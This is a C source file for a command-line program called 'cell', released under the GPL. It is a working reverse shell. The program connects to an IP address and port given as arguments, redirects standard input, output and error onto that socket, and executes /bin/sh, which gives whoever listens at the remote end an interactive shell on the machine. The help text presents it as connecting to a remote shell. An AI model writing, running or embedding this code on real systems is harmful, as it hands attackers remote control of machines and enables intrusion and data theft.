/* Copyright 2023 Elijah Gordon (NitrixXero) <nitrixxero@gmail.com>

*  This program is free software; you can redistribute it and/or
*  modify it under the terms of the GNU General Public License
*  as published by the Free Software Foundation; either version 2
*  of the License, or (at your option) any later version.

*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.

*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software
*  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h> 

#define PROGRAM_NAME "cell"
#define PROGRAM_VERSION "1.0"

void printHelp() {
    printf("Usage: %s <address> <port>\n", PROGRAM_NAME);
    printf("Connects to a remote shell on the specified address and port.\n");
}

void printVersion() {
    printf("%s version %s\n", PROGRAM_NAME, PROGRAM_VERSION);
}

int main(int argc, char *argv[]) {
    if (argc == 2) {

        if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
            printHelp();
            return 0;
        }

        if (strcmp(argv[1], "--version") == 0 || strcmp(argv[1], "-v") == 0) {
            printVersion();
            return 0;
        }
    }

    if (argc != 3) {
        printf("Invalid number of arguments. Use '%s --help' for usage.\n", PROGRAM_NAME);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (sockt < 0) {
        perror("socket");
        return 1;
    }

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &revsockaddr.sin_addr) <= 0) {
        perror("inet_pton");
        return 1;
    }

    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
        perror("connect");
        return 1;
    }

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const exec_args[] = {"/bin/sh", NULL};
    execve("/bin/sh", exec_args, NULL);

    perror("execve");
    return 1;
}
